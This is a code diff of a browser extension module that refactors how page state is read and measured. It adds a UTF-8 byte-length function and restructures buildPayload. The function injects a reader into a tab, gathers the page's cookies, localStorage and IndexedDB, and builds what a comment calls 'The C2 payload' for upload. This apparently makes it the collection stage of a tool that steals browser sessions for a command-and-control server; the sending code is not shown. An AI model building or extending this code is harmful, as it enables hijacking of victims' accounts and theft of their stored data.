@@ -8,8 +8,21 @@ import { readPageState } from "./read-page.js";
 export const MAX_SEND_BYTES = 33554432;
 const MIB = 1048576;
 
-const encoder = new TextEncoder();
-const byteLength = (s) => encoder.encode(s).length;
+// The UTF-8 length of a string, without an encoded copy of it (the JSON can be 32 MiB). A lone
+// surrogate counts 3 bytes, as TextEncoder writes U+FFFD for it.
+export function byteLength(s) {
+  let n = 0;
+  for (let i = 0; i < s.length; i++) {
+    const c = s.charCodeAt(i);
+    if (c < 0x80) n += 1;
+    else if (c < 0x800) n += 2;
+    else if (c >= 0xd800 && c < 0xdc00 && (s.charCodeAt(i + 1) & 0xfc00) === 0xdc00) {
+      n += 4;
+      i += 1;
+    } else n += 3;
+  }
+  return n;
+}
 const mib = (n) => (n / MIB).toFixed(1);
 const hostOf = (box) => {
   try {
@@ -109,14 +122,21 @@ export class SendStop extends Error {}
 
 export const MOVED_TEXT = "The tab moved to another page. Send again.";
 
-export async function buildPayload(chrome, { tabId, url, domain, boxes = [] }) {
-  const origin = new URL(url).origin;
+// The page's read, parsed. The reader's JSON string (up to MAX_SEND_BYTES) is not kept after this.
+async function readTab(chrome, tabId, origin) {
   await chrome.scripting.executeScript({ target: { tabId }, files: ["lib/codec.js"] });
   const [injected] = await chrome.scripting.executeScript({
     target: { tabId }, func: readPageState, args: [MAX_SEND_BYTES, origin],
   });
   if (typeof injected?.result !== "string") throw new Error("no page read");
-  const read = JSON.parse(injected.result);
+  return JSON.parse(injected.result);
+}
+
+// The C2 payload as its JSON string. The result holds only the string, not the payload object
+// next to it, so a send keeps one copy of the state while its upload runs.
+export async function buildPayload(chrome, { tabId, url, domain, boxes = [] }) {
+  const origin = new URL(url).origin;
+  const read = await readTab(chrome, tabId, origin);
   // The tab can show another page by the time the reader runs.
   if (read?.origin !== origin) throw new SendStop(MOVED_TEXT);
   if (read.tooLarge) throw new SendStop(readerTooLargeText(read.tooLarge));
@@ -129,14 +149,13 @@ export async function buildPayload(chrome, { tabId, url, domain, boxes = [] }) {
     .filter((c) => inScope(c, domain) && !boxGetsCookie(c, hosts))
     .map(cleanCookie);
 
-  const payload = { v: 1, domain, url, origin, cookies, storage };
-  const json = JSON.stringify(payload);
   let largest = null;
   for (const db of storage.idb) {
     const n = byteLength(JSON.stringify(db));
     if (largest === null || n > largest.bytes) largest = { name: db.name, bytes: n };
   }
-  return { payload, json, bytes: byteLength(json), largest, skipped: skipped ?? [] };
+  const json = JSON.stringify({ v: 1, domain, url, origin, cookies, storage });
+  return { json, bytes: byteLength(json), largest, skipped: skipped ?? [] };
 }
 
 export function tooLargeText(bytes, largest) {
